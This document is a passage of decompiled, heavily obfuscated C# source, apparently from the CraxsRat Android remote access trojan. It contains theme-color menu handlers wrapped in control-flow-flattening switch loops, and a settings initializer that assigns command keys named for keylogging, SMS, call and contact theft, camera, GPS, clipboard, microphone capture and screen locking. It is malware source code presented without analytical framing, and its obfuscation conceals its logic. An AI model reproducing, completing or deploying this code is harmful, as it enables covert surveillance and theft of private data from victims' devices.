    }

    private void Clr4ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Color[] packet = new Color[4]
      {
        Color.FromArgb(217, 63, 135),
        Color.FromArgb(42, 27, 60),
        Color.FromArgb(130, 101, 167),
        Color.FromArgb(68, 49, 141)
      };
label_1:
      int num1 = -1793741318;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~(-(num1 * -2010936799) ^ -1055039639) * 810936397)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.CrateColor(packet);
            num1 = (int) num2 * -243854648 ^ 1910730214;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Clr5ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CrateColor(new Color[4]
      {
        Color.FromArgb(61, 61, 61),
        Color.FromArgb(222, 222, 222),
        Color.FromArgb(4, 94, 175),
        Color.FromArgb(30, 175, 4)
      });
    }

    private void Clr6ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Color[] packet = new Color[4]
      {
        Color.FromArgb(0, 122, 204),
        Color.FromArgb(37, 37, 38),
        Color.FromArgb(241, 241, 241),
        Color.FromArgb(87, 116, 48)
      };
label_1:
      int num1 = -686585146;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 - (795563583 - (~178007616 - 682828747 * 1940138646) - (~(1128368130 - -259298631) - --1418867465) - -(199063645 - 927364472)) - (1719746567 * 225576981 + -1827886546 + -(-219820295 ^ -1891493204) + (-(1467956537 * -1838591759) - (1922080367 ^ -1839989003) * -1956409251)) - ~(977313318 - 1446285718 ^ --571484989))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.CrateColor(packet);
            num1 = (int) num2 * -1696822871 ^ -652126987;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Clr7ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Color[] packet = new Color[4]
      {
        Color.FromArgb(45, 40, 62),
        Color.FromArgb(208, 215, 225),
        Color.FromArgb(129, 43, 178),
        Color.FromArgb(158, 165, 172)
      };
label_1:
      int num1 = 1543067867;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --~(-(num1 + -(-1821393590 - 99685849)) + (~-1276237592 ^ 737165648 - 384308008 + (-368387736 ^ -62883069)))) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            this.CrateColor(packet);
            num1 = (int) num2 * 1038695044 ^ 1573113340;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Clr8ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Color[] packet = new Color[4]
      {
        Color.FromArgb(94, 94, 94),
        Color.FromArgb(40, 40, 40),
        Color.FromArgb(198, 198, 198),
        Color.FromArgb(12, 159, 26)
      };
label_1:
      int num1 = -393800433;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(-(1848205673 - 1024187122 - (-384725598 ^ -139554502) - (~484936621 + (-1929424354 ^ -608875414)) - -(num2 ^ ~(-921335306 * -1743780373) ^ (2045606575 ^ -477526739 * -877773432 ^ 681993796 ^ 1963738675) - (~-1012217925 ^ 1845304024 - 1446938467) * -235135143)) ^ ~-644984887)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.CrateColor(packet);
            num1 = (int) num3 * -648539090 ^ -1124643802;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void Clr9ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Color[] packet = new Color[4]
      {
        Color.FromArgb(232, 191, 106),
        Color.FromArgb(43, 43, 43),
        Color.FromArgb(169, 183, 198),
        Color.FromArgb(75, 119, 81)
      };
label_1:
      int num1 = 2070633173;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~-~((num1 ^ -1480610437 * -~(2134627393 * (-582147838 - 1116814294))) - -(-(320659916 + 1811721787) - -~1090249692) ^ ~(-160827196 * 1606944915 ^ -302867535 ^ -1185494297))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.CrateColor(packet);
            num1 = (int) num2 * 1140149537 ^ 360340702;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    static Settings()
    {
      SMSManager.getinfo = (string) null;
      SMSManager.getCalls = (string) null;
label_1:
      int num1 = -1260757920;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~-num1 * 1192168925 - -1377952719 * -1580078090 * -1768167475 ^ -1509747219) + 292625730)) % 28U)
        {
          case 0:
            Client.KeysClient5 = (string) null;
            Client.KeysClient6 = (string) null;
            Client.KeysClient7 = (string) null;
            Client.KeysClient8 = (string) null;
            num1 = (int) num2 * 615108872 ^ 230835203;
            continue;
          case 1:
            Client.KeysClient11 = (string) null;
            Client.KeysGetClient = (string) null;
            num1 = (int) num2 * 781413910 ^ -448381308;
            continue;
          case 2:
            Accept.upload_info = (string) null;
            num1 = (int) num2 * 962194528 ^ -800778104;
            continue;
          case 3:
            Client.SHOT = (string) null;
            Client.Keylogger = (string) null;
            Client.AppsProperties = (string) null;
            num1 = (int) num2 * 2055751353 ^ -10021290;
            continue;
          case 4:
            Accept.getGPS = (string) null;
            num1 = (int) num2 * 986126275 ^ -128794071;
            continue;
          case 5:
            Client.acquire = (string) null;
            num1 = (int) num2 * 2104708090 ^ -1640816625;
            continue;
          case 6:
            Accept.ImageViewer = (string) null;
            num1 = (int) num2 * -519695506 ^ 1174177154;
            continue;
          case 7:
            Client.KeysClient9 = (string) null;
            Client.KeysClient10 = (string) null;
            num1 = (int) num2 * -741029373 ^ -705435504;
            continue;
          case 8:
            Accept.Apps = (string) null;
            num1 = (int) num2 * 1546299275 ^ 685140786;
            continue;
          case 9:
            Client.MicwaveinByte = (string) null;
            Client.editor = (string) null;
            num1 = (int) num2 * -1596907843 ^ 425778518;
            continue;
          case 10:
            Accept.uploadByte = (string) null;
            Accept.MicwaveOutByte = (string) null;
            num1 = (int) num2 * -928259798 ^ -1817281144;
            continue;
          case 11:
            goto label_3;
          case 12:
            Client.resultClient = (string) null;
            num1 = (int) num2 * -920198097 ^ 1700574491;
            continue;
          case 13:
            SMSManager.getContacts = (string) null;
            SMSManager.getCamera = (string) null;
            num1 = (int) num2 * 517966391 ^ 1416329320;
            continue;
          case 14:
            SMSManager.getSMS = (string) null;
            num1 = (int) num2 * -1691511656 ^ 1448665381;
            continue;
          case 15:
            // ISSUE: reference to a compiler-generated field
            SMSManager._Closure\u0024__.getCommand = (string) null;
            Accept.getGSM = (string) null;
            num1 = (int) num2 * -1142635450 ^ -528931208;
            continue;
          case 16:
            Client.KeysClient1 = (string) null;
            num1 = (int) num2 * 344424568 ^ -1101056896;
            continue;
          case 17:
            Accept.getUpdate = (string) null;
            num1 = (int) num2 * 2029553579 ^ -1264038189;
            continue;
          case 18:
            Client.KeysClient2 = (string) null;
            num1 = (int) num2 * -80563138 ^ -90528105;
            continue;
          case 19:
            SMSManager.Lockscreen = (string) null;
            // ISSUE: reference to a compiler-generated field
            SMSManager._Closure\u0024__.getfiles = (string) null;
            num1 = (int) num2 * -2104329293 ^ 494980664;
            continue;
          case 20:
            Client.KeysClient4 = (string) null;
            num1 = (int) num2 * 843765585 ^ 1184139162;
            continue;
          case 21:
            // ISSUE: reference to a compiler-generated field
            SMSManager._Closure\u0024__.Bing = (string) null;
            num1 = (int) num2 * -685402485 ^ 81767736;
            continue;
          case 22:
            Accept.down_info = (string) null;
            num1 = (int) num2 * 1778047148 ^ 803037783;
            continue;
          case 23:
            Client.KeysClient3 = (string) null;
            num1 = (int) num2 * 2059529562 ^ 1442566356;
            continue;
          case 24:
            Accept.Account = (string) null;
            Accept.Information = (string) null;
            num1 = (int) num2 * 1306907749 ^ -693286907;
            continue;
          case 25:
            Client.getClipboard = (string) null;
            num1 = (int) num2 * 683450779 ^ -1940975887;
            continue;
          case 26:
            goto label_1;
          case 27:
            Accept.downByte = (string) null;
            num1 = (int) num2 * 590556498 ^ 1782444746;
            continue;
          default:
            goto label_30;
        }
      }
label_3:
      return;
label_30:;
    }

    public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwejhga()
    {
      SMSManager.getinfo = SecurityKey.Key();
label_1:
      int num1 = -1529799602;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~--(num1 * -781414967) + ~1340688135 - 580906198)) % 21U)
        {
          case 0:
            Client.KeysClient5 = EXGuarder.\u0031D3B4638;
            Client.KeysClient6 = EXGuarder.\u00319444449;
            Client.KeysClient7 = EXGuarder.\u003263F2B30;
            Client.KeysClient8 = EXGuarder.\u0033539416B;
            num1 = (int) num2 * -1868384418 ^ -305243244;
            continue;
          case 1:
            Client.acquire = SecurityKey.Key();
            Client.getClipboard = SecurityKey.Key();
            Client.KeysClient1 = EXGuarder.\u00315526940;
            Client.KeysClient2 = EXGuarder.\u0031E052158;
            num1 = (int) num2 * -1002049757 ^ -1962856223;
            continue;
          case 2:
            Client.KeysClient11 = EXGuarder.\u003626B6A07;
            Client.KeysGetClient = EXGuarder.\u0031B644E41;
            num1 = (int) num2 * -1753238508 ^ 475029307;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            SMSManager._Closure\u0024__.Bing = SecurityKey.Key();
            num1 = (int) num2 * -53275342 ^ -1251138021;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            SMSManager._Closure\u0024__.getCommand = SecurityKey.Key();
            num1 = (int) num2 * -133719905 ^ -1633695478;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            SMSManager._Closure\u0024__.getfiles = SecurityKey.Key();
            num1 = (int) num2 * -1516885960 ^ 2055652187;
            continue;
          case 7:
            Client.KeysClient9 = EXGuarder.\u00326035065;
            num1 = (int) num2 * 1626577350 ^ 1701418295;
            continue;
          case 8:
            goto label_1;
          case 9:
            Accept.down_info = SecurityKey.Key() + EXGuarder.\u003483D3B33;
            Accept.downByte = SecurityKey.Key() + EXGuarder.\u003483D3B33;
            Accept.upload_info = SecurityKey.Key();
            num1 = (int) num2 * 341694388 ^ 1786724209;
            continue;
          case 10:
            Client.KeysClient10 = EXGuarder.\u0030F1C6967;
            num1 = (int) num2 * 1338512061 ^ -321185983;
            continue;
          case 11:
            Accept.getGPS = SecurityKey.Key();
            num1 = (int) num2 * 1662131956 ^ 2001386255;
            continue;
          case 12:
            Accept.getGSM = SecurityKey.Key();
            num1 = (int) num2 * 1049167370 ^ 1218823677;
            continue;
          case 13:
            Accept.Apps = SecurityKey.Key();
            num1 = (int) num2 * -1199244837 ^ -1665326339;
            continue;
          case 14:
            Client.KeysClient3 = EXGuarder.\u0034E476415;
            num1 = (int) num2 * -2095765643 ^ 952705110;
            continue;
          case 15:
            Accept.Account = SecurityKey.Key();
            Accept.Information = SecurityKey.Key();
            Client.MicwaveinByte = SecurityKey.Key();
            Client.editor = SecurityKey.Key();
            Client.SHOT = SecurityKey.Key();
            Accept.getUpdate = SecurityKey.Key();
            num1 = (int) num2 * -2117255957 ^ 1816340620;
            continue;
          case 16:
            Accept.uploadByte = SecurityKey.Key();
            Accept.MicwaveOutByte = SecurityKey.Key();
            Accept.ImageViewer = SecurityKey.Key() + EXGuarder.\u003483D3B33;
            num1 = (int) num2 * -1188019563 ^ 693508850;
            continue;
          case 17:
            Client.Keylogger = SecurityKey.Key();
            num1 = (int) num2 * 132732342 ^ 961782310;
            continue;
          case 18:
            Client.KeysClient4 = EXGuarder.\u00343265062;
            num1 = (int) num2 * 681743029 ^ -894811885;
            continue;
          case 19:
            SMSManager.getCalls = SecurityKey.Key();
            SMSManager.getContacts = SecurityKey.Key();
            SMSManager.getCamera = SecurityKey.Key();
            SMSManager.Lockscreen = EXGuarder.\u0030270502D;
            num1 = (int) num2 * 301147026 ^ 1400973856;
            continue;
          case 20:
            Client.AppsProperties = SecurityKey.Key();
            num1 = (int) num2 * 1043358999 ^ 1170452325;
            continue;
          default:
            goto label_22;
        }
      }
label_22:
      Client.resultClient = EXGuarder.\u0035F721D5E;
    }
  }
}
